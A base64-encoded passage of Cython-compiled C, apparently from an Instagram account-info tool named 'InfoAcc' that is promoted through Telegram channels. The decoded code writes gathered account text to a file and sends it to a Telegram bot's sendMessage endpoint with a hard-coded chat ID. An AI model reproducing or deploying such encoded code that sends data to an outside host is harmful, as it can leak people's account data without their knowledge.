eF9rcF91X2h0dHBzX3d3d19pbnN0YWdyYW1fY29tOwogIF9fcHl4X3RfMTNbMTNdID0gX19weXhfdF8xMjsKICBfX3B5eF90XzEzWzE0XSA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfR0hPU1RfUkZYXzI7CiAgX19weXhfdF8xNCA9IF9fUHl4X1B5VW5pY29kZV9Kb2luKF9fcHl4X3RfMTMsIDE1LCA2MCArIF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKF9fcHl4X3RfNCkgKyAxMSArIF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKF9fcHl4X3RfMykgKyAyMSArIF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKF9fcHl4X3RfMSkgKyAxNSAqIDIgKyBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChfX3B5eF90XzIpICsgX19QeXhfUHlVbmljb2RlX0dFVF9MRU5HVEgoX19weXhfdF8xMCkgKyAxMiArIF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKF9fcHl4X3RfMTEpICsgMzYgKyBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChfX3B5eF90XzEyKSArIDU3LCAxMTE0MTExIHwgX19QeXhfUHlVbmljb2RlX01BWF9DSEFSX1ZBTFVFKF9fcHl4X3RfNCkgfCBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUoX19weXhfdF8zKSB8IF9fUHl4X1B5VW5pY29kZV9NQVhfQ0hBUl9WQUxVRShfX3B5eF90XzEpIHwgX19QeXhfUHlVbmljb2RlX01BWF9DSEFSX1ZBTFVFKF9fcHl4X3RfMikgfCBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUoX19weXhfdF8xMCkgfCBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUoX19weXhfdF8xMSkgfCBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUoX19weXhfdF8xMikpOwogIGlmICh1bmxpa2VseSghX19weXhfdF8xNCkpIF9fUFlYX0VSUigwLCAzNDgsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzE0KTsKICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKICBfX1B5eF9ERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDsKICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwOwogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzExKTsgX19weXhfdF8xMSA9IDA7CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTIpOyBfX3B5eF90XzEyID0gMDsKICBfX3B5eF92X2luZm9fdGV4dCA9ICgoUHlPYmplY3QqKV9fcHl4X3RfMTQpOwogIF9fcHl4X3RfMTQgPSAwOwoKICAKICBfX3B5eF90XzEyID0gTlVMTDsKICBfX1B5eF9JTkNSRUYoX19weXhfYnVpbHRpbl9wcmludCk7CiAgX19weXhfdF8xMSA9IF9fcHl4X2J1aWx0aW5fcHJpbnQ7IAogIF9fcHl4X3RfNSA9IDE7CiAgewogICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMTIsIF9fcHl4X3ZfaW5mb190ZXh0fTsKICAgIF9fcHl4X3RfMTQgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzExLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzUsICgyLV9fcHl4X3RfNSkgfCAoX19weXhfdF81Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEyKTsgX19weXhfdF8xMiA9IDA7CiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwOwogICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzE0KSkgX19QWVhfRVJSKDAsIDM2NywgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xNCk7CiAgfQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzE0KTsgX19weXhfdF8xNCA9IDA7CgogIAogICB7CiAgICBfX3B5eF90XzE0ID0gX19QeXhfUHlPYmplY3RfQ2FsbChfX3B5eF9idWlsdGluX29wZW4sIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzhdLCBOVUxMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzE0KSkgX19QWVhfRVJSKDAsIDM2OSwgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xNCk7CiAgICBfX3B5eF90XzYgPSBfX1B5eF9QeU9iamVjdF9Mb29rdXBTcGVjaWFsKF9fcHl4X3RfMTQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9leGl0KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgMzY5LCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpOwogICAgX19weXhfdF8xMiA9IE5VTEw7CiAgICBfX3B5eF90XzEwID0gX19QeXhfUHlPYmplY3RfTG9va3VwU3BlY2lhbChfX3B5eF90XzE0LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZW50ZXIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTApKSBfX1BZWF9FUlIoMCwgMzY5LCBfX3B5eF9MMjFfZXJyb3IpCiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMCk7CiAgICBfX3B5eF90XzUgPSAxOwogICAgI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EUwogICAgaWYgKGxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzEwKSkpIHsKICAgICAgX19weXhfdF8xMiA9IFB5TWV0aG9kX0dFVF9TRUxGKF9fcHl4X3RfMTApOwogICAgICBhc3NlcnQoX19weXhfdF8xMik7CiAgICAgIFB5T2JqZWN0KiBfX3B5eF9fZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oX19weXhfdF8xMCk7CiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzEyKTsKICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7CiAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF8xMCwgX19weXhfX2Z1bmN0aW9uKTsKICAgICAgX19weXhfdF81ID0gMDsKICAgIH0KICAgICNlbmRpZgogICAgewogICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8xMiwgTlVMTH07CiAgICAgIF9fcHl4X3RfMTEgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzEwLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzUsICgxLV9fcHl4X3RfNSkgfCAoX19weXhfdF81Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTIpOyBfX3B5eF90XzEyID0gMDsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDsKICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzExKSkgX19QWVhfRVJSKDAsIDM2OSwgX19weXhfTDIxX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMSk7CiAgICB9CiAgICBfX3B5eF90XzEwID0gX19weXhfdF8xMTsKICAgIF9fcHl4X3RfMTEgPSAwOwogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTQpOyBfX3B5eF90XzE0ID0gMDsKICAgICB7CiAgICAgIHsKICAgICAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2RlY2xhcmUKICAgICAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2Fzc2lnbgogICAgICAgIF9fUHl4X0V4Y2VwdGlvblNhdmUoJl9fcHl4X3RfNywgJl9fcHl4X3RfOCwgJl9fcHl4X3RfMTUpOwogICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF83KTsKICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfOCk7CiAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzE1KTsKICAgICAgICAgewogICAgICAgICAgX19weXhfdl9mID0gX19weXhfdF8xMDsKICAgICAgICAgIF9fcHl4X3RfMTAgPSAwOwoKICAgICAgICAgIAogICAgICAgICAgX19weXhfdF8xNCA9IF9fcHl4X3ZfZjsKICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzE0KTsKICAgICAgICAgIF9fcHl4X3RfMTEgPSBfX1B5eF9QeVVuaWNvZGVfQ29uY2F0KF9fcHl4X3ZfaW5mb190ZXh0LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X18xMyk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMSkpIF9fUFlYX0VSUigwLCAzNzAsIF9fcHl4X0wyNV9lcnJvcikKICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzExKTsKICAgICAgICAgIF9fcHl4X3RfNSA9IDA7CiAgICAgICAgICB7CiAgICAgICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzE0LCBfX3B5eF90XzExfTsKICAgICAgICAgICAgX19weXhfdF8xMCA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsTWV0aG9kKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV93cml0ZSwgX19weXhfY2FsbGFyZ3MrX19weXhfdF81LCAoMi1fX3B5eF90XzUpIHwgKDEqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xNCk7IF9fcHl4X3RfMTQgPSAwOwogICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwOwogICAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTApKSBfX1BZWF9FUlIoMCwgMzcwLCBfX3B5eF9MMjVfZXJyb3IpCiAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEwKTsKICAgICAgICAgIH0KICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7CgogICAgICAgICAgCiAgICAgICAgfQogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDsKICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7CiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzE1KTsgX19weXhfdF8xNSA9IDA7CiAgICAgICAgZ290byBfX3B5eF9MMzBfdHJ5X2VuZDsKICAgICAgICBfX3B5eF9MMjVfZXJyb3I6OwogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDsKICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDsKICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDsKICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTIpOyBfX3B5eF90XzEyID0gMDsKICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTQpOyBfX3B5eF90XzE0ID0gMDsKICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgICAgICAgewogICAgICAgICAgX19QeXhfQWRkVHJhY2ViYWNrKCJhdy5JbmZvQWNjIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7CiAgICAgICAgICBpZiAoX19QeXhfR2V0RXhjZXB0aW9uKCZfX3B5eF90XzEwLCAmX19weXhfdF8xMSwgJl9fcHl4X3RfMTQpIDwgMCkgX19QWVhfRVJSKDAsIDM2OSwgX19weXhfTDI3X2V4Y2VwdF9lcnJvcikKICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xMCk7CiAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTEpOwogICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzE0KTsKICAgICAgICAgIF9fcHl4X3RfMTIgPSBQeVR1cGxlX1BhY2soMywgX19weXhfdF8xMCwgX19weXhfdF8xMSwgX19weXhfdF8xNCk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMikpIF9fUFlYX0VSUigwLCAzNjksIF9fcHl4X0wyN19leGNlcHRfZXJyb3IpCiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMik7CiAgICAgICAgICBfX3B5eF90XzE2ID0gX19QeXhfUHlPYmplY3RfQ2FsbChfX3B5eF90XzYsIF9fcHl4X3RfMTIsIE5VTEwpOwogICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7CiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMik7IF9fcHl4X3RfMTIgPSAwOwogICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzE2KSkgX19QWVhfRVJSKDAsIDM2OSwgX19weXhfTDI3X2V4Y2VwdF9lcnJvcikKICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzE2KTsKICAgICAgICAgIF9fcHl4X3RfOSA9IF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShfX3B5eF90XzE2KTsKICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzE2KTsgX19weXhfdF8xNiA9IDA7CiAgICAgICAgICBpZiAoX19weXhfdF85IDwgKDApKSBfX1BZWF9FUlIoMCwgMzY5LCBfX3B5eF9MMjdfZXhjZXB0X2Vycm9yKQogICAgICAgICAgX19weXhfdF8xNyA9ICghX19weXhfdF85KTsKICAgICAgICAgIGlmICh1bmxpa2VseShfX3B5eF90XzE3KSkgewogICAgICAgICAgICBfX1B5eF9HSVZFUkVGKF9fcHl4X3RfMTApOwogICAgICAgICAgICBfX1B5eF9HSVZFUkVGKF9fcHl4X3RfMTEpOwogICAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzE0KTsKICAgICAgICAgICAgX19QeXhfRXJyUmVzdG9yZVdpdGhTdGF0ZShfX3B5eF90XzEwLCBfX3B5eF90XzExLCBfX3B5eF90XzE0KTsKICAgICAgICAgICAgX19weXhfdF8xMCA9IDA7ICBfX3B5eF90XzExID0gMDsgIF9fcHl4X3RfMTQgPSAwOyAKICAgICAgICAgICAgX19QWVhfRVJSKDAsIDM2OSwgX19weXhfTDI3X2V4Y2VwdF9lcnJvcikKICAgICAgICAgIH0KICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwOwogICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzExKTsgX19weXhfdF8xMSA9IDA7CiAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTQpOyBfX3B5eF90XzE0ID0gMDsKICAgICAgICAgIGdvdG8gX19weXhfTDI2X2V4Y2VwdGlvbl9oYW5kbGVkOwogICAgICAgIH0KICAgICAgICBfX3B5eF9MMjdfZXhjZXB0X2Vycm9yOjsKICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzcpOwogICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfOCk7CiAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xNSk7CiAgICAgICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF83LCBfX3B5eF90XzgsIF9fcHl4X3RfMTUpOwogICAgICAgIGdvdG8gX19weXhfTDFfZXJyb3I7CiAgICAgICAgX19weXhfTDI2X2V4Y2VwdGlvbl9oYW5kbGVkOjsKICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzcpOwogICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfOCk7CiAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xNSk7CiAgICAgICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF83LCBfX3B5eF90XzgsIF9fcHl4X3RfMTUpOwogICAgICAgIF9fcHl4X0wzMF90cnlfZW5kOjsKICAgICAgfQogICAgfQogICAgIHsKICAgICAgewogICAgICAgIGlmIChfX3B5eF90XzYpIHsKICAgICAgICAgIF9fcHl4X3RfMTUgPSBfX1B5eF9QeU9iamVjdF9DYWxsKF9fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbM10sIE5VTEwpOwogICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7CiAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTUpKSBfX1BZWF9FUlIoMCwgMzY5LCBfX3B5eF9MMV9lcnJvcikKICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzE1KTsKICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzE1KTsgX19weXhfdF8xNSA9IDA7CiAgICAgICAgfQogICAgICAgIGdvdG8gX19weXhfTDI0OwogICAgICB9CiAgICAgIF9fcHl4X0wyNDo7CiAgICB9CiAgICBnb3RvIF9fcHl4X0wzNDsKICAgIF9fcHl4X0wyMV9lcnJvcjo7CiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKICAgIGdvdG8gX19weXhfTDFfZXJyb3I7CiAgICBfX3B5eF9MMzQ6OwogIH0KCiAgCiAgewogICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9kZWNsYXJlCiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2Fzc2lnbgogICAgX19QeXhfRXhjZXB0aW9uU2F2ZSgmX19weXhfdF82LCAmX19weXhfdF8xNSwgJl9fcHl4X3RfOCk7CiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNik7CiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTUpOwogICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzgpOwogICAgIHsKCiAgICAgIAogICAgICBfX3B5eF90XzE0ID0gX19QeXhfUHlEaWN0X05ld1ByZXNpemVkKDEpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTQpKSBfX1BZWF9FUlIoMCwgMzc0LCBfX3B5eF9MMzVfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzE0KTsKCiAgICAgIAogICAgICBfX3B5eF90XzExID0gX19QeXhfUHlEaWN0X05ld1ByZXNpemVkKDIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTEpKSBfX1BZWF9FUlIoMCwgMzc2LCBfX3B5eF9MMzVfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzExKTsKICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfMTEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV90ZXh0LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X0RldikgPCAoMCkpIF9fUFlYX0VSUigwLCAzNzYsIF9fcHl4X0wzNV9lcnJvcikKICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfMTEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV91cmwsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfaHR0cHNfdF9tZV9HaG9zdF9SRlgpIDwgKDApKSBfX1BZWF9FUlIoMCwgMzc2LCBfX3B5eF9MMzVfZXJyb3IpCgogICAgICAKICAgICAgX19weXhfdF8xMCA9IF9fUHl4X1B5RGljdF9OZXdQcmVzaXplZCgyKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEwKSkgX19QWVhfRVJSKDAsIDM3NywgX19weXhfTDM1X2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMCk7CiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzEwLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdGV4dCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9DaGFubmVsKSA8ICgwKSkgX19QWVhfRVJSKDAsIDM3NywgX19weXhfTDM1X2Vycm9yKQogICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF8xMCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3VybCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9odHRwc190X21lX3Y2ZjRDNjFkMExOak5EWmgpIDwgKDApKSBfX1BZWF9FUlIoMCwgMzc3LCBfX3B5eF9MMzVfZXJyb3IpCgogICAgICAKICAgICAgX19weXhfdF8xMiA9IFB5TGlzdF9OZXcoMik7IGlmICh1bmxpa2VseSghX19weXhfdF8xMikpIF9fUFlYX0VSUigwLCAzNzUsIF9fcHl4X0wzNV9lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTIpOwogICAgICBfX1B5eF9HSVZFUkVGKF9fcHl4X3RfMTEpOwogICAgICBpZiAoX19QeXhfUHlMaXN0X1NFVF9JVEVNKF9fcHl4X3RfMTIsIDAsIF9fcHl4X3RfMTEpICE9ICgwKSkgX19QWVhfRVJSKDAsIDM3NSwgX19weXhfTDM1X2Vycm9yKTsKICAgICAgX19QeXhfR0lWRVJFRihfX3B5eF90XzEwKTsKICAgICAgaWYgKF9fUHl4X1B5TGlzdF9TRVRfSVRFTShfX3B5eF90XzEyLCAxLCBfX3B5eF90XzEwKSAhPSAoMCkpIF9fUFlYX0VSUigwLCAzNzUsIF9fcHl4X0wzNV9lcnJvcik7CiAgICAgIF9fcHl4X3RfMTEgPSAwOwogICAgICBfX3B5eF90XzEwID0gMDsKCiAgICAgIAogICAgICBfX3B5eF90XzEwID0gUHlMaXN0X05ldygxKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEwKSkgX19QWVhfRVJSKDAsIDM3NCwgX19weXhfTDM1X2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMCk7CiAgICAgIF9fUHl4X0dJVkVSRUYoX19weXhfdF8xMik7CiAgICAgIGlmIChfX1B5eF9QeUxpc3RfU0VUX0lURU0oX19weXhfdF8xMCwgMCwgX19weXhfdF8xMikgIT0gKDApKSBfX1BZWF9FUlIoMCwgMzc0LCBfX3B5eF9MMzVfZXJyb3IpOwogICAgICBfX3B5eF90XzEyID0gMDsKICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfMTQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9pbmxpbmVfa2V5Ym9hcmQsIF9fcHl4X3RfMTApIDwgKDApKSBfX1BZWF9FUlIoMCwgMzc0LCBfX3B5eF9MMzVfZXJyb3IpCiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7CiAgICAgIF9fcHl4X3Zfa2V5Ym9hcmQgPSAoKFB5T2JqZWN0KilfX3B5eF90XzE0KTsKICAgICAgX19weXhfdF8xNCA9IDA7CgogICAgICAKICAgICAgX19weXhfdF8xMCA9IE5VTEw7CiAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8xMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JlcXVlc3RzKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEyKSkgX19QWVhfRVJSKDAsIDM4MiwgX19weXhfTDM1X2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMik7CiAgICAgIF9fcHl4X3RfMTEgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfMTIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9nZXQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTEpKSBfX1BZWF9FUlIoMCwgMzgyLCBfX3B5eF9MMzVfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzExKTsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTIpOyBfX3B5eF90XzEyID0gMDsKICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzEyLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfVE9LRU4pOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTIpKSBfX1BZWF9FUlIoMCwgMzgyLCBfX3B5eF9MMzVfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEyKTsKICAgICAgX19weXhfdF8yID0gX19QeXhfUHlPYmplY3RfRm9ybWF0U2ltcGxlKF9fcHl4X3RfMTIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3VuaWNvZGUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCAzODIsIF9fcHl4X0wzNV9lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEyKTsgX19weXhfdF8xMiA9IDA7CiAgICAgIF9fcHl4X3RfMThbMF0gPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2h0dHBzX2FwaV90ZWxlZ3JhbV9vcmdfYm90OwogICAgICBfX3B5eF90XzE4WzFdID0gX19weXhfdF8yOwogICAgICBfX3B5eF90XzE4WzJdID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9zZW5kTWVzc2FnZTsKICAgICAgX19weXhfdF8xMiA9IF9fUHl4X1B5VW5pY29kZV9Kb2luKF9fcHl4X3RfMTgsIDMsIDI4ICsgX19QeXhfUHlVbmljb2RlX0dFVF9MRU5HVEgoX19weXhfdF8yKSArIDEyLCAxMjcgfCBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUoX19weXhfdF8yKSk7CiAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xMikpIF9fUFlYX0VSUigwLCAzODIsIF9fcHl4X0wzNV9lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTIpOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKCiAgICAgIAogICAgICBfX3B5eF90XzIgPSBfX1B5eF9QeURpY3RfTmV3UHJlc2l6ZWQoNSk7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDM4NCwgX19weXhfTDM1X2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTsKICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9JRCk7IGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDM4NCwgX19weXhfTDM1X2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTsKICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2NoYXRfaWQsIF9fcHl4X3RfMSkgPCAoMCkpIF9fUFlYX0VSUigwLCAzODQsIF9fcHl4X0wzNV9lcnJvcikKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7CgogICAgICAKICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3RleHQsIF9fcHl4X3ZfaW5mb190ZXh0KSA8ICgwKSkgX19QWVhfRVJSKDAsIDM4NCwgX19weXhfTDM1X2Vycm9yKQogICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcGFyc2VfbW9kZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl9